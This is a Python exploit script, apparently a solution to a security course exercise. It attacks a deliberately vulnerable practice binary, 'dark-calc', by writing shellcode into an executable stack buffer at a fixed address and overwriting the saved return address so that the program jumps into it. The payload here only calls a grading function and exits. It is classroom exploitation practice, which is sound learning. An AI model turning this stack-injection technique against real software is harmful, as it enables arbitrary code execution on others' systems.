#!/usr/bin/env python3
"""Task 2 -- put machine code on the call stack of attack/dark-calc and run it.

dark-calc's call stack lives at a *fixed* address and is mapped PROT_READ|WRITE|EXEC
by init_fixed_stack(), so the buffer of input() is always at 0x721000800fd0 and it is
executable.  We therefore only have to overwrite the saved return address with the
address of the buffer itself.

Shell code (24 bytes, ends exactly where the return-address slot begins):

    bf 04 00 00 00              mov    edi, 4          ; 1st argument of grade_eval
    48 b8 87 1a 40 00 00 00 00 00   mov rax, 0x401a87   ; &grade_eval (absolute,
    ff d0                       call   rax             ;   a rel32 call cannot reach it)
    b8 3c 00 00 00              mov    eax, 60         ; SYS_exit
    0f 05                       syscall

grade_eval(4) prints " Hope A will be your grade!" and flushes stdout before the
syscall terminates the process cleanly.
"""
import sys
import struct

BUFFER = 0x721000800FD0     # &expression inside input()
GRADE_EVAL = 0x401A87

p64 = lambda x: struct.pack("<Q", x)

shellcode = bytes([
    0xBF, 0x04, 0x00, 0x00, 0x00,                                     # mov edi, 4
    0x48, 0xB8, *struct.pack("<Q", GRADE_EVAL),                       # mov rax, grade_eval
    0xFF, 0xD0,                                                       # call rax
    0xB8, 0x3C, 0x00, 0x00, 0x00,                                     # mov eax, 60
    0x0F, 0x05,                                                       # syscall
])
assert len(shellcode) == 24

payload = shellcode                       # starts at the buffer itself; the last 8
                                          # bytes also overwrite the saved rbp slot
payload += p64(BUFFER)                    # return address -> our shell code

assert len(payload) == 32
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
